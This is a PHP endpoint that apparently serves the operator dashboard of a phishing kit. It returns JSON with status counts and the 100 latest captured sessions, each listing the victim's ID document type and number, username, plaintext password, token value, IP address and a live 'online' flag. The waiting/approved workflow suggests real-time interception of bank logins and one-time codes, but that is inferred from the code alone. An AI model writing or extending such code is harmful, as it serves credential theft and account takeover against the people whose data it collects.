<?php
require_once __DIR__ . '/../core/db.php';
header('Content-Type: application/json');
header('Cache-Control: no-cache, no-store, must-revalidate');

session_start();
if (empty($_SESSION['sucv_admin_auth'])) {
    http_response_code(403);
    echo json_encode(['error' => 'unauthorized']);
    exit;
}

$pdo = getDB();
$now = time();

$stats = [
    'total'    => (int)$pdo->query("SELECT COUNT(*) FROM sessions")->fetchColumn(),
    'waiting'  => (int)$pdo->query("SELECT COUNT(*) FROM sessions WHERE status = 'waiting'")->fetchColumn(),
    'approved' => (int)$pdo->query("SELECT COUNT(*) FROM sessions WHERE status = 'approved'")->fetchColumn(),
    'errors'   => (int)$pdo->query("SELECT COUNT(*) FROM sessions WHERE status = 'error'")->fetchColumn(),
];

$rows = $pdo->query("SELECT * FROM sessions ORDER BY created_at DESC LIMIT 100")->fetchAll(PDO::FETCH_ASSOC);

$sessions = [];
foreach ($rows as $row) {
    $lastSeen = (int)($row['last_seen'] ?? 0);
    $isOnline = ($now - $lastSeen) <= 15;

    $sessions[] = [
        'sid'           => $row['session_id'],
        'id'            => $row['id'],
        'doc_type'      => $row['doc_type'],
        'doc_num'       => $row['doc_num'],
        'username'      => $row['username'],
        'password'      => $row['password'],
        'token_value'   => $row['token_value'] ?? '',
        'ip'            => $row['ip'],
        'status'        => $row['status'],
        'is_online'     => $isOnline,
        'created_at'    => $row['created_at'],
        'updated_at_ts' => strtotime($row['last_seen'] ?? $row['created_at']),
    ];
}

echo json_encode(['stats' => $stats, 'sessions' => $sessions]);
?>
